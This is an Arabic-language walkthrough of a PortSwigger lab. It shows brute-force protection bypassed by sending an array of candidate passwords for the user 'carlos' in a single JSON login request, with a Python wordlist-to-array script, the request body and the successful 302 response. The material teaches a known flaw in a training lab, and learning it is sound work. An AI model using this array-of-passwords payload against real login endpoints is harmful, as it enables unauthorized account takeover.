# [Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)
21-10-2025

> **الهدف**: استغلال خلل يسمح بإرسال مجموعة كلمات مرور في طلب واحد (password array) بحيث يتعامل الخادم مع الطلب بطريقة تؤدي لتجاوز حماية الـ brute-force. بعد إيجاد الباسورد الصحيح، قم بالدخول إلى صفحة الحساب `carlos`.

---

## 1) ملخص سريع للثغرة

التطبيق يقبل حقل `password` على أنه مصفوفة من الكلمات وليس قيمة مفردة، ويمكنه التحقق من كل العناصر في نفس الطلب. هذا يؤدي إلى منطق خاطئ في حماية الـ brute-force لأنك تستطيع إرسال مجموعة من المحاولات دفعة واحدة في طلب واحد — أي أنك تختصر عدة محاولات في طلب واحد وتتجاوز عدّاد الرفض/التأخير.

**النتيجة العملية**: إرسال JSON مثل:

```json
{
  "username": "carlos",
  "password": ["123456","password","qwerty", ...]
}
```

ثم الخادم يعيد استجابة تشير إلى تسجيل دخول ناجح (مثلاً `302 Found` مع `Location: /my-account?id=carlos` و`Set-Cookie: session=...`).

---

## 2)الخطوات

1. أرسلت أولاً طلب تسجيل دخول عادي من المتصفح ولاحظت شكل الـ request: `{"username":"carlos","password":"asdf"}`.
2. أرسلت الطلب إلى **Burp** وفتحت **Intruder/Repeater** للتعديل والاختبار.
3. لاحظت التلميح في الوصف: يبدو أن `password` يمكن أن يكون مصفوفة.
4. جهزت قائمة كلمات (ملف `pass.txt`) وحوّلتها إلى مصفوفة JSON كما يلي (سكربت بايثون بسيط):

```python
with open('pass.txt', 'r') as f:
    passwords = [f'"{line.rstrip()}"' for line in f]

result = "[\n    " + ",\n    ".join(passwords) + "\n]"
print(result)
```

5. وضعت الناتج داخل حقل `password` في جسم الـ JSON ورفعت الطلب. مثال جسم الطلب

```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "qwerty",
    ...
  ]
}
```

6. حصلت على استجابة 
```txt
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=7n4aQ2HPfRlHDGJiLkzPWoaobojvI0O1; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```
6. فتحت المتصفح باستخدام نفس الجلسة/الكوكي وشوفت صفحة الحساب:
	1. <mark style="background: #ADCCFFA6;">المختبر اتحل. الحمد لله </mark>
---

## 4) (فهم منطقي)

* السيرفر يتعامل مع الـ `password` كمصفوفة ويجرب عناصرها داخل نفس العملية بدلاً من عدّ كل محاولة على أنها طلب مستقل.
* حماية الـ brute-force مُصمّمة عادةً لحساب عدد الطلبات الخاطئة لكل جلسة/IP/يوزر، لكن هنا كل طلب يخفي داخله عدة محاولات.
* النتيجة: القدرة على تجربة عدد كبير من كلمات المرور داخل عدد قليل من الطلبات، وتجاوز آليات الحظر التقليدية.

---
